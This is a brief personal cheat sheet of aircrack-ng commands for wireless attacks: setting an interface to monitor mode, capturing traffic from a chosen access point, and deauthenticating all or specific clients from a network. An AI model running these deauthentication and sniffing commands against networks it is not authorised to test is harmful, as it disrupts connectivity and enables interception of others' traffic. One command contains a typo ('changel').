=== Hacking ===

ifconfig <iface> down; iwconfig <iface> mode monitor; ifconfig <iface> up
- switch to monitor mode manually, directly on the interface
airmon-ng start <iface>
- switch to monitor mode, creates new promiscuous interface
ifconfig <iface> down; airmon-ng check kill; airmon-ng start <iface>; ifconfig <iface> up - switch to monitor mode manually
- switch to monitor mode (new interface) and kill all possibly interfering processes beforehand

- before starting airmon-ng you can use iwconfig <iface> changel <channel> to set current channel
- might help with the "couldn't determine current channel" issue

airodump-ng <iface>
- sniff packets
- by default shows info about all wireless networks
airodump-ng --channel 36 --bssid F4:F2:6D:EC:DC:9C --write airodump.out mon0
- sniff on specific network

aireplay-ng --deauth <num of packets> -e <ssid> -a <AP> --ignore-negative-one <iface>
- deauthenticate all clients in network
aireplay-ng --deauth <num of packets> -e <ssid> -a <AP> -c <target> --ignore-negative-one <iface>
- deauthenticate specific client
